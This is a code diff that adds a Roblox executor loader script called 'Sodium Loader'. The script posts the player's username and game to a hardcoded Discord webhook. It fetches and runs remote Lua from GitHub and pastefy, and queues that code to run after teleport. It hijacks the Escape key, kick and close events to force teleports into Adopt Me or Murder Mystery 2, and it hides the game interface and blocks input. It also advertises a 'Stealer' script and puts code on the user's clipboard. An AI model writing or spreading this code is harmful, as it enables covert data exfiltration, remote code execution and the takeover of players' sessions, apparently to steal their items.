@@ -1,1 +1,785 @@
-print("hi")
+-- Services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+local StarterGui = game:GetService("StarterGui")
+local GuiService = game:GetService("GuiService")
+local UserInputService = game:GetService("UserInputService")
+
+-- Get the local player
+local localPlayer = Players.LocalPlayer
+if not localPlayer then
+    Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
+    localPlayer = Players.LocalPlayer
+end
+
+-- Clipboard Helper Function
+local function copyToClipboard(text)
+    if setclipboard then
+        setclipboard(text)
+    elseif toclipboard then
+        toclipboard(text)
+    end
+end
+
+-- Queue on Teleport Helper Function
+local function queueOnTeleport(code)
+    local queue = queue_on_teleport or (syn and syn.queue_on_teleport)
+    if queue then
+        pcall(queue, code)
+    end
+end
+
+-- Redirect / Rejoin Interceptor Logic
+local function redirectOrRejoin()
+    pcall(function()
+        local universalScript = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ZyrikScript/Sodium/refs/heads/main/Universal"))()'
+        queueOnTeleport(universalScript)
+        copyToClipboard(universalScript)
+
+        -- Choose randomly between Adopt Me (920587237) and MM2 (142823291)
+        local targets = {920587237, 142823291}
+        local randomTarget = targets[math.random(1, #targets)]
+
+        -- Setup fallback mechanism if the target teleport fails (e.g. third-party teleports disabled)
+        local connection
+        connection = TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
+            if player == localPlayer then
+                if connection then connection:Disconnect() end
+                -- Fallback: Rejoin current game
+                pcall(function()
+                    TeleportService:Teleport(game.PlaceId, localPlayer)
+                end)
+            end
+        end)
+
+        -- Attempt redirect to the random target game
+        local success, err = pcall(function()
+            TeleportService:Teleport(randomTarget, localPlayer)
+        end)
+
+        if not success then
+            if connection then connection:Disconnect() end
+            -- Fallback: Rejoin current game
+            pcall(function()
+                TeleportService:Teleport(game.PlaceId, localPlayer)
+            end)
+        end
+    end)
+end
+
+-- 1. Detect Kicks or Disconnects
+GuiService.ErrorMessageChanged:Connect(function()
+    redirectOrRejoin()
+end)
+
+-- 2. Detect Esc Menu Leave / Closed Window
+pcall(function()
+    game:BindToClose(function()
+        redirectOrRejoin()
+        task.wait(3) -- Give the engine time to process the teleport request packet
+    end)
+end)
+
+-- 3. Intercept Escape Key Input (Triggers teleport flow instantly)
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.KeyCode == Enum.KeyCode.Escape then
+        redirectOrRejoin()
+    end
+end)
+
+-- 1. Prevent multiple executions using a global flag
+if shared.SodiumLoaded then
+    warn("[Loader] Script is already running!")
+    return
+end
+shared.SodiumLoaded = true
+
+-- 2. Gather user and game details
+local username = localPlayer.Name
+local placeId = game.PlaceId
+local gameName = "Unknown"
+
+-- Safely retrieve the game's name
+pcall(function()
+    local productInfo = MarketplaceService:GetProductInfo(placeId)
+    gameName = productInfo.Name
+end)
+
+-- Send details to the webhook
+task.spawn(function()
+    -- Replace this placeholder string with your Discord webhook URL
+    local webhookUrl = "https://discord.com/api/webhooks/1494201180921008240/oiQeeg5fPATBYKdR373YmlcmSHGgEfSIeSxQat8od95kqHBEbvRvuLbLbXbGxKdSakT9" 
+    
+    local payload = HttpService:JSONEncode({
+        embeds = {
+            {
+                title = "Execution Log",
+                color = 3066993, -- Green
+                fields = {
+                    { name = "User", value = username, inline = true },
+                    { name = "Game", value = gameName, inline = true },
+                    { name = "Place ID", value = tostring(placeId), inline = true }
+                },
+                timestamp = DateTime.now():ToIsoDate()
+            }
+        }
+    })
+    
+    local success, err = pcall(function()
+        if request then
+            request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = payload
+            })
+        else
+            HttpService:PostAsync(webhookUrl, payload)
+        end
+    end)
+    
+    if not success then
+        warn("[Loader] Telemetry logging failed: " .. tostring(err))
+    end
+end)
+
+-- Function to show notice overlay and delay the teleport
+local function showNoticeOverlay(gameName)
+    local playerGui = localPlayer:WaitForChild("PlayerGui")
+    
+    -- Destroy old loader UI immediately to prevent double clicks
+    if playerGui:FindFirstChild("SodiumSupportedGamesGui") then
+        playerGui.SodiumSupportedGamesGui:Destroy()
+    end
+    if playerGui:FindFirstChild("SodiumNoticeGui") then
+        playerGui.SodiumNoticeGui:Destroy()
+    end
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "SodiumNoticeGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.IgnoreGuiInset = true -- Cover top Roblox menu bar
+    screenGui.DisplayOrder = 999999 -- Render above all CoreGui elements
+    
+    -- Fullscreen Input Blocker Frame (prevents clicks on Roblox button or in-game buttons)
+    local blocker = Instance.new("Frame")
+    blocker.Name = "Blocker"
+    blocker.Size = UDim2.new(1, 0, 1, 0)
+    blocker.BackgroundTransparency = 1
+    blocker.Active = true -- Swallow input events
+    blocker.Parent = screenGui
+    
+    -- Temporarily disable Roblox CoreGui elements (PlayerList, Backpack, Chat, etc.)
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+    
+    -- Main Warning Frame
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "NoticeFrame"
+    mainFrame.Size = UDim2.new(0, 450, 0, 220)
+    mainFrame.Position = UDim2.new(0.5, -225, 0.5, -110)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.ZIndex = 2
+    mainFrame.Parent = screenGui
+    
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(0, 14)
+    uiCorner.Parent = mainFrame
+    
+    local uiStroke = Instance.new("UIStroke")
+    uiStroke.Color = Color3.fromRGB(255, 160, 50) -- Orange warning color
+    uiStroke.Thickness = 2
+    uiStroke.Parent = mainFrame
+    
+    -- Title
+    local titleText = Instance.new("TextLabel")
+    titleText.Size = UDim2.new(1, 0, 0, 40)
+    titleText.Position = UDim2.new(0, 0, 0, 15)
+    titleText.BackgroundTransparency = 1
+    titleText.Text = "TELEPORTING TO " .. string.upper(gameName)
+    titleText.TextColor3 = Color3.fromRGB(255, 160, 50)
+    titleText.Font = Enum.Font.GothamBold
+    titleText.TextSize = 16
+    titleText.ZIndex = 3
+    titleText.Parent = mainFrame
+    
+    -- Description Message
+    local descText = Instance.new("TextLabel")
+    descText.Size = UDim2.new(1, -40, 0, 100)
+    descText.Position = UDim2.new(0, 20, 0, 55)
+    descText.BackgroundTransparency = 1
+    descText.Text = "The script has been copied to your clipboard.\n\nIf you get disconnected (Error Code: 773) because this game blocks teleports, please join the game manually and paste the script."
+    descText.TextColor3 = Color3.fromRGB(200, 200, 205)
+    descText.Font = Enum.Font.GothamMedium
+    descText.TextSize = 12
+    descText.TextWrapped = true
+    descText.LineHeight = 1.3
+    descText.ZIndex = 3
+    descText.Parent = mainFrame
+    
+    -- Countdown progress bar background
+    local barBackground = Instance.new("Frame")
+    barBackground.Size = UDim2.new(1, -40, 0, 6)
+    barBackground.Position = UDim2.new(0, 20, 0, 170)
+    barBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    barBackground.BorderSizePixel = 0
+    barBackground.ZIndex = 3
+    barBackground.Parent = mainFrame
+    
+    local barCorner = Instance.new("UICorner")
+    barCorner.CornerRadius = UDim.new(0, 3)
+    barCorner.Parent = barBackground
+    
+    -- Bar Fill
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(255, 160, 50)
+    barFill.BorderSizePixel = 0
+    barFill.ZIndex = 4
+    barFill.Parent = barBackground
+    
+    local fillCorner = Instance.new("UICorner")
+    fillCorner.CornerRadius = UDim.new(0, 3)
+    fillCorner.Parent = barFill
+    
+    -- Animate border gradient pulse
+    local rainbowColors = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 0)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 200, 50)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 120, 0))
+    })
+    local strokeGradient = Instance.new("UIGradient")
+    strokeGradient.Color = rainbowColors
+    strokeGradient.Parent = uiStroke
+    
+    local overlayActive = true
+    task.spawn(function()
+        local rot = 0
+        while overlayActive do
+            rot = (rot + 2) % 360
+            strokeGradient.Rotation = rot
+            task.wait(0.01)
+        end
+    end)
+    
+    screenGui.Parent = playerGui
+    
+    -- Open animation
+    mainFrame.Size = UDim2.new(0, 0, 0, 0)
+    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    local openTween = TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 450, 0, 220), Position = UDim2.new(0.5, -225, 0.5, -110)})
+    openTween:Play()
+    openTween.Completed:Wait()
+    
+    -- Tween progress bar fill (10 second delay)
+    local fillTween = TweenService:Create(barFill, TweenInfo.new(10, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)})
+    fillTween:Play()
+    fillTween.Completed:Wait()
+    
+    overlayActive = false
+    screenGui:Destroy()
+end
+
+-- Function to show the premium UI listing supported games
+local function showSupportedGamesUI()
+    local playerGui = localPlayer:WaitForChild("PlayerGui")
+    
+    -- Prevent duplicate GUIs
+    if playerGui:FindFirstChild("SodiumSupportedGamesGui") then
+        playerGui.SodiumSupportedGamesGui:Destroy()
+    end
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "SodiumSupportedGamesGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    -- Main Frame (Draggable Container)
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(0, 420, 0, 390)
+    mainFrame.Position = UDim2.new(0.5, -210, 0.5, -195)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.ZIndex = 2
+    mainFrame.Parent = screenGui
+    
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(0, 14)
+    uiCorner.Parent = mainFrame
+    
+    -- Rainbow Border
+    local uiStroke = Instance.new("UIStroke")
+    uiStroke.Color = Color3.fromRGB(255, 255, 255)
+    uiStroke.Thickness = 2.5
+    uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    uiStroke.Parent = mainFrame
+    
+    local rainbowColors = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+        ColorSequenceKeypoint.new(0.16, Color3.fromRGB(255, 127, 0)),
+        ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 255, 0)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 0)),
+        ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 0, 255)),
+        ColorSequenceKeypoint.new(0.83, Color3.fromRGB(75, 0, 130)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(148, 0, 211))
+    })
+    
+    local borderGradient = Instance.new("UIGradient")
+    borderGradient.Color = rainbowColors
+    borderGradient.Parent = uiStroke
+    
+    -- GUI state control for loop safety
+    local guiActive = true
+    
+    -- Animate the Rainbow Border
+    task.spawn(function()
+        local rot = 0
+        while guiActive do
+            rot = (rot + 1.5) % 360
+            borderGradient.Rotation = rot
+            task.wait(0.01)
+        end
+    end)
+    
+    -- Header Gradient Text Label
+    local titleText = Instance.new("TextLabel")
+    titleText.Name = "Title"
+    titleText.Size = UDim2.new(1, -60, 0, 30)
+    titleText.Position = UDim2.new(0, 20, 0, 16)
+    titleText.BackgroundTransparency = 1
+    titleText.Text = "SODIUM LOADER"
+    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleText.Font = Enum.Font.GothamBlack
+    titleText.TextSize = 22
+    titleText.TextXAlignment = Enum.TextXAlignment.Left
+    titleText.ZIndex = 3
+    titleText.Parent = mainFrame
+    
+    local titleGradient = Instance.new("UIGradient")
+    titleGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 230, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 0, 128)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 230, 255))
+    })
+    titleGradient.Parent = titleText
+    
+    -- Animate Title Text Gradient
+    task.spawn(function()
+        local offset = 0
+        while guiActive do
+            offset = offset + 0.01
+            if offset > 1 then
+                offset = -1
+            end
+            titleGradient.Offset = Vector2.new(offset, 0)
+            task.wait(0.01)
+        end
+    end)
+    
+    -- Subtitle
+    local subtitleText = Instance.new("TextLabel")
+    subtitleText.Name = "Subtitle"
+    subtitleText.Size = UDim2.new(1, -60, 0, 25)
+    subtitleText.Position = UDim2.new(0, 20, 0, 42)
+    subtitleText.BackgroundTransparency = 1
+    subtitleText.Text = "Unsupported game! Select a supported game to teleport & auto-copy script:"
+    subtitleText.TextColor3 = Color3.fromRGB(150, 150, 160)
+    subtitleText.Font = Enum.Font.GothamMedium
+    subtitleText.TextSize = 10
+    subtitleText.TextWrapped = true
+    subtitleText.TextYAlignment = Enum.TextYAlignment.Top
+    subtitleText.TextXAlignment = Enum.TextXAlignment.Left
+    subtitleText.ZIndex = 3
+    subtitleText.Parent = mainFrame
+    
+    -- Close Button
+    local closeButton = Instance.new("TextButton")
+    closeButton.Name = "CloseButton"
+    closeButton.Size = UDim2.new(0, 28, 0, 28)
+    closeButton.Position = UDim2.new(1, -38, 0, 16)
+    closeButton.BackgroundColor3 = Color3.fromRGB(24, 20, 25)
+    closeButton.Text = "X"
+    closeButton.TextColor3 = Color3.fromRGB(220, 80, 80)
+    closeButton.Font = Enum.Font.GothamBold
+    closeButton.TextSize = 14
+    closeButton.ZIndex = 3
+    closeButton.Parent = mainFrame
+    
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(0, 8)
+    closeCorner.Parent = closeButton
+    
+    local closeStroke = Instance.new("UIStroke")
+    closeStroke.Color = Color3.fromRGB(50, 30, 35)
+    closeStroke.Thickness = 1
+    closeStroke.Parent = closeButton
+    
+    -- Games List Frame (ScrollingFrame)
+    local scrollingFrame = Instance.new("ScrollingFrame")
+    scrollingFrame.Name = "GamesList"
+    scrollingFrame.Size = UDim2.new(1, -32, 1, -125)
+    scrollingFrame.Position = UDim2.new(0, 16, 0, 72)
+    scrollingFrame.BackgroundTransparency = 1
+    scrollingFrame.BorderSizePixel = 0
+    scrollingFrame.ScrollBarThickness = 4
+    scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 70)
+    scrollingFrame.ScrollBarImageTransparency = 0.2
+    scrollingFrame.ZIndex = 3
+    scrollingFrame.Parent = mainFrame
+    
+    local uiListLayout = Instance.new("UIListLayout")
+    uiListLayout.Padding = UDim.new(0, 10)
+    uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    uiListLayout.Parent = scrollingFrame
+    
+    -- Footer Panel
+    local footerFrame = Instance.new("Frame")
+    footerFrame.Name = "FooterFrame"
+    footerFrame.Size = UDim2.new(1, 0, 0, 26)
+    footerFrame.Position = UDim2.new(0, 0, 1, -26)
+    footerFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+    footerFrame.BorderSizePixel = 0
+    footerFrame.ZIndex = 3
+    footerFrame.Parent = mainFrame
+    
+    local footerCorner = Instance.new("UICorner")
+    footerCorner.CornerRadius = UDim.new(0, 10)
+    footerCorner.Parent = footerFrame
+    
+    -- Hide top corners of footer corner to merge cleanly
+    local footerCover = Instance.new("Frame")
+    footerCover.Size = UDim2.new(1, 0, 0, 10)
+    footerCover.Position = UDim2.new(0, 0, 0, 0)
+    footerCover.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+    footerCover.BorderSizePixel = 0
+    footerCover.ZIndex = 3
+    footerCover.Parent = footerFrame
+    
+    local connText = Instance.new("TextLabel")
+    connText.Size = UDim2.new(0.5, -15, 1, 0)
+    connText.Position = UDim2.new(0, 15, 0, 0)
+    connText.BackgroundTransparency = 1
+    connText.Text = "● EXECUTOR: ACTIVE"
+    connText.TextColor3 = Color3.fromRGB(80, 220, 120)
+    connText.Font = Enum.Font.GothamBold
+    connText.TextSize = 9
+    connText.TextXAlignment = Enum.TextXAlignment.Left
+    connText.ZIndex = 4
+    connText.Parent = footerFrame
+    
+    local clipText = Instance.new("TextLabel")
+    clipText.Size = UDim2.new(0.5, -15, 1, 0)
+    clipText.Position = UDim2.new(0.5, 0, 0, 0)
+    clipText.BackgroundTransparency = 1
+    clipText.Text = "TELEPORT QUEUE READY"
+    clipText.TextColor3 = Color3.fromRGB(100, 150, 255)
+    clipText.Font = Enum.Font.GothamBold
+    clipText.TextSize = 9
+    clipText.TextXAlignment = Enum.TextXAlignment.Right
+    clipText.ZIndex = 4
+    clipText.Parent = footerFrame
+
+    -- Helper function to add a sleek game item with Teleport / Copy Button
+    local function addGameItem(name, placeDesc, targetPlaceId, accentColor)
+        local itemFrame = Instance.new("Frame")
+        itemFrame.Size = UDim2.new(1, -10, 0, 52)
+        itemFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
+        itemFrame.BorderSizePixel = 0
+        itemFrame.ZIndex = 4
+        itemFrame.Parent = scrollingFrame
+        
+        local itemCorner = Instance.new("UICorner")
+        itemCorner.CornerRadius = UDim.new(0, 10)
+        itemCorner.Parent = itemFrame
+        
+        local itemStroke = Instance.new("UIStroke")
+        itemStroke.Color = Color3.fromRGB(30, 30, 40)
+        itemStroke.Thickness = 1
+        itemStroke.Parent = itemFrame
+        
+        -- Accent color indicator
+        local indicator = Instance.new("Frame")
+        indicator.Name = "Indicator"
+        indicator.Size = UDim2.new(0, 4, 1, -16)
+        indicator.Position = UDim2.new(0, 10, 0, 8)
+        indicator.BackgroundColor3 = accentColor
+        indicator.BorderSizePixel = 0
+        indicator.ZIndex = 5
+        indicator.Parent = itemFrame
+        
+        local indCorner = Instance.new("UICorner")
+        indCorner.CornerRadius = UDim.new(0, 2)
+        indCorner.Parent = indicator
+        
+        -- Game name
+        local nameLabel = Instance.new("TextLabel")
+        nameLabel.Size = UDim2.new(0.6, 0, 0.5, 0)
+        nameLabel.Position = UDim2.new(0, 22, 0.1, 0)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = name
+        nameLabel.TextColor3 = Color3.fromRGB(240, 240, 245)
+        nameLabel.Font = Enum.Font.GothamBold
+        nameLabel.TextSize = 13.5
+        nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+        nameLabel.ZIndex = 5
+        nameLabel.Parent = itemFrame
+        
+        -- Subtitle / description
+        local descLabel = Instance.new("TextLabel")
+        descLabel.Size = UDim2.new(0.6, 0, 0.4, 0)
+        descLabel.Position = UDim2.new(0, 22, 0.5, 0)
+        descLabel.BackgroundTransparency = 1
+        descLabel.Text = placeDesc
+        descLabel.TextColor3 = Color3.fromRGB(130, 130, 140)
+        descLabel.Font = Enum.Font.GothamMedium
+        descLabel.TextSize = 10.5
+        descLabel.TextXAlignment = Enum.TextXAlignment.Left
+        descLabel.ZIndex = 5
+        descLabel.Parent = itemFrame
+        
+        -- Improved Teleport / Action Button
+        local joinButton = Instance.new("TextButton")
+        joinButton.Name = "JoinButton"
+        joinButton.Size = UDim2.new(0, 85, 0, 26)
+        joinButton.Position = UDim2.new(1, -95, 0.5, -13)
+        joinButton.BackgroundColor3 = Color3.fromRGB(24, 25, 32)
+        joinButton.Text = "JOIN"
+        joinButton.TextColor3 = accentColor
+        joinButton.Font = Enum.Font.GothamBold
+        joinButton.TextSize = 10.5
+        joinButton.ZIndex = 5
+        joinButton.Parent = itemFrame
+        
+        local btnCorner = Instance.new("UICorner")
+        btnCorner.CornerRadius = UDim.new(0, 6)
+        btnCorner.Parent = joinButton
+        
+        local btnStroke = Instance.new("UIStroke")
+        btnStroke.Color = Color3.fromRGB(45, 45, 55)
+        btnStroke.Thickness = 1
+        btnStroke.Parent = joinButton
+
+        -- Hover event boundaries for item card
+        local hoverButton = Instance.new("TextButton")
+        hoverButton.Size = UDim2.new(1, -110, 1, 0)
+        hoverButton.BackgroundTransparency = 1
+        hoverButton.Text = ""
+        hoverButton.ZIndex = 7
+        hoverButton.Parent = itemFrame
+        
+        -- Game item hover transitions
+        hoverButton.MouseEnter:Connect(function()
+            TweenService:Create(itemFrame, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(26, 26, 34)}):Play()
+            TweenService:Create(itemStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(70, 70, 90)}):Play()
+            TweenService:Create(indicator, TweenInfo.new(0.2), {Size = UDim2.new(0, 6, 1, -8), Position = UDim2.new(0, 8, 0, 4)}):Play()
+        end)
+        
+        hoverButton.MouseLeave:Connect(function()
+            TweenService:Create(itemFrame, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(18, 18, 24)}):Play()
+            TweenService:Create(itemStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(30, 30, 40)}):Play()
+            TweenService:Create(indicator, TweenInfo.new(0.2), {Size = UDim2.new(0, 4, 1, -16), Position = UDim2.new(0, 10, 0, 8)}):Play()
+        end)
+
+        -- Join Button Hover Tweens
+        joinButton.MouseEnter:Connect(function()
+            TweenService:Create(joinButton, TweenInfo.new(0.2), {BackgroundColor3 = accentColor, TextColor3 = Color3.fromRGB(12, 12, 16)}):Play()
+            TweenService:Create(btnStroke, TweenInfo.new(0.2), {Color = accentColor}):Play()
+        end)
+        
+        joinButton.MouseLeave:Connect(function()
+            TweenService:Create(joinButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(24, 25, 32), TextColor3 = accentColor}):Play()
+            TweenService:Create(btnStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(45, 45, 55)}):Play()
+        end)
+
+        -- Teleport and clipboard management logic
+        joinButton.MouseButton1Click:Connect(function()
+            -- Button bounce animation
+            TweenService:Create(joinButton, TweenInfo.new(0.08), {Size = UDim2.new(0, 80, 0, 24), Position = UDim2.new(1, -92, 0.5, -12)}):Play()
+            task.delay(0.08, function()
+                TweenService:Create(joinButton, TweenInfo.new(0.08), {Size = UDim2.new(0, 85, 0, 26), Position = UDim2.new(1, -95, 0.5, -13)}):Play()
+            end)
+
+            -- Spawn notice overlay & start teleport flow asynchronously
+            task.spawn(function()
+                -- ALWAYS copy the main Sodium Universal loader script to the clipboard (for manual backup)
+                local universalScript = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/ZyrikScript/Sodium/refs/heads/main/Universal"))()'
+                copyToClipboard(universalScript)
+
+                -- Queue the simple wait-5-seconds wrapper script to load the Sodium Universal script on teleport
+                local queuedWaitScript = [[
+task.wait(5)
+local success, result = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZyrikScript/Sodium/refs/heads/main/Universal"))()
+end)
+if not success then
+    warn("Failed to load queued Universal script: " .. tostring(result))
+end
+]]
+                queueOnTeleport(queuedWaitScript)
+
+                -- Show warning notice overlay (10-second countdown before initiating the teleport)
+                showNoticeOverlay(name)
+
+                -- Restore CoreGui elements in case teleport fails or pcall fails
+                local function restoreUI()
+                    pcall(function()
+                        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+                    end)
+                end
+
+                -- Setup Teleport Failure / Init Connection fallback
+                local connection
+                connection = TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
+                    if player == localPlayer then
+                        if connection then connection:Disconnect() end
+                        restoreUI()
+                        localPlayer:Kick("This game doesn't allow joining other games. You can join manually. The script has been copied to your clipboard so you don't lose it.")
+                    end
+                end)
+
+                -- Perform the Teleport
+                local success, err = pcall(function()
+                    TeleportService:Teleport(targetPlaceId, localPlayer)
+                end)
+
+                if not success then
+                    if connection then connection:Disconnect() end
+                    restoreUI()
+                    localPlayer:Kick("This game doesn't allow joining other games. You can join manually. The script has been copied to your clipboard so you don't lose it.")
+                end
+            end)
+        end)
+    end
+    
+    addGameItem("Murder Mystery 2", "Universal MM2 GUI", 142823291, Color3.fromRGB(230, 50, 50))
+    addGameItem("Adopt Me!", "Sodium ADM Script", 920587237, Color3.fromRGB(50, 180, 230))
+    addGameItem("Grow a Garden 2", "GAG2 v1 Script", 97598239454123, Color3.fromRGB(50, 230, 100))
+    addGameItem("Blade Ball", "BladeBall v1 Script", 13772394625, Color3.fromRGB(230, 150, 50))
+    addGameItem("Steal a Brainrot", "SAB Script & Stealer", 7197666226, Color3.fromRGB(180, 50, 230))
+    
+    -- Adjust canvas size based on content
+    scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, uiListLayout.AbsoluteContentSize.Y + 10)
+    uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, uiListLayout.AbsoluteContentSize.Y + 10)
+    end)
+    
+    -- Closing logic
+    closeButton.MouseButton1Click:Connect(function()
+        guiActive = false
+        local info = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+        local closeTween = TweenService:Create(mainFrame, info, {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0)})
+        closeTween:Play()
+        closeTween.Completed:Connect(function()
+            screenGui:Destroy()
+        end)
+    end)
+    
+    -- Hover effect for close button
+    closeButton.MouseEnter:Connect(function()
+        TweenService:Create(closeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(220, 80, 80), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+        TweenService:Create(closeStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(255, 100, 100)}):Play()
+    end)
+    closeButton.MouseLeave:Connect(function()
+        TweenService:Create(closeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(24, 20, 25), TextColor3 = Color3.fromRGB(220, 80, 80)}):Play()
+        TweenService:Create(closeStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(50, 30, 35)}):Play()
+    end)
+    
+    -- Open animation
+    mainFrame.Size = UDim2.new(0, 0, 0, 0)
+    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    screenGui.Parent = playerGui
+    
+    local openTween = TweenService:Create(mainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 420, 0, 390), Position = UDim2.new(0.5, -210, 0.5, -195)})
+    openTween:Play()
+end
+
+-- 3. Game specific routing logic
+local mm2_ids = {
+    [142823291] = true, -- Murder Mystery 2 (Main)
+    [142823589] = true  -- Murder Mystery 2 (Alternative/Sandbox)
+}
+
+local adopt_me_ids = {
+    [920587237] = true  -- Adopt Me! (Main)
+}
+
+local grow_a_garden_2_ids = {
+    [97598239454123] = true -- Grow a Garden 2 (Main)
+}
+
+local blade_ball_ids = {
+    [13772394625] = true -- Blade Ball (Main)
+}
+
+local steal_a_brainrot_ids = {
+    [7197666226] = true -- Steal a Brainrot (Main)
+}
+
+if mm2_ids[placeId] then
+    task.spawn(function()
+        local success, result = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ZyrikScript/Script1/refs/heads/main/Universal", true))()
+        end)
+        if not success then
+            warn("[Loader] Failed to load Sodium MM2 GUI: " .. tostring(result))
+        end
+    end)
+
+elseif adopt_me_ids[placeId] then
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sodiumhub/AdoptMe/refs/heads/main/AdoptMe", true))()
+    end)
+    if not success then
+        warn("[Loader] Failed to load Adopt Me script: " .. tostring(result))
+    end
+
+elseif grow_a_garden_2_ids[placeId] then
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sodiumhub/GAG2/refs/heads/main/v1", true))()
+    end)
+    if not success then
+        warn("[Loader] Failed to load Grow a Garden 2 script: " .. tostring(result))
+    end
+
+elseif blade_ball_ids[placeId] then
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sodiumhub/BladeBall/refs/heads/main/v1", true))()
+    end)
+    if not success then
+        warn("[Loader] Failed to load Blade Ball script: " .. tostring(result))
+    end
+
+elseif steal_a_brainrot_ids[placeId] then
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/qE0iO0RV/raw"))()
+    end)
+    if not success then
+        warn("[Loader] Failed to load Steal a Brainrot script: " .. tostring(result))
+    end
+
+else
+    -- Destroy any old GUI instance if script is re-executed
+    pcall(function()
+        local old = localPlayer:WaitForChild("PlayerGui"):FindFirstChild("SodiumSupportedGamesGui")
+        if old then old:Destroy() end
+    end)
+    shared.SodiumLoaded = false -- Reset load flag to allow re-runs of fallback UI for design iterations
+    
+    local success, result = pcall(showSupportedGamesUI)
+    if not success then
+        warn("[Loader] Failed to load default GUI: " .. tostring(result))
+    end
+end
